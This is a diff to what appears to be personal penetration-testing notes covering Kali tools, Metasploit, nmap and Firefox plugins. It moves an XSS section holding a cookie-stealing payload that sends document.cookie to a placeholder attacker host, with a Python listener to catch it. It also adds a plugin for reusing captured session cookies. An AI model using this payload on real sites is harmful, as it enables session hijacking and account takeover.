@@ -26,9 +26,12 @@ https://github.com/nvm-sh/nvm#install--update-script
 
 ## FoxyProxy
 Firefox plugin
-https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/?utm_source=addons.mozilla.org&utm_medium=referral&utm_content=search
+https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/
 
-
+## Cookie Manager
+Firefox plugin  
+Used to reuse fetched auth / session cookies  
+https://addons.mozilla.org/fr/firefox/addon/a-cookie-manager/
 
 ## flameshot (screenshot)
 ### Install
@@ -301,15 +304,6 @@ Restart metasploit-framework
 ## Export database
 
     db_export -f xml -a /kali-share/metasploit-framework.xml
-    
-# XSS
-
-## Payloads
-### Simple
-    <script>alert('XSS')</script>
-    
-### Cookie forwarding
-    <script>document.write('<img src="http://<attacker-ip>:<listening-port>/?'+document.cookie+'" />');</script>
 
 # Training
 ## Virtual machines
@@ -357,6 +351,17 @@ For UDP use -sU
     sudo nmap -sN <ip> -p<port>
     
 For UDP use -sU
+## XSS
+
+### Payloads
+#### Simple
+    <script>alert('XSS')</script>
+    
+#### Cookie forwarding
+    <script>document.write('<img src="http://<attacker-ip>:<listening-port>/?'+document.cookie+'" />');</script>
+
+##### Listening with python http server
+    python3 -m http.server <listening-port>
 
 # Lexical
 ## Samba
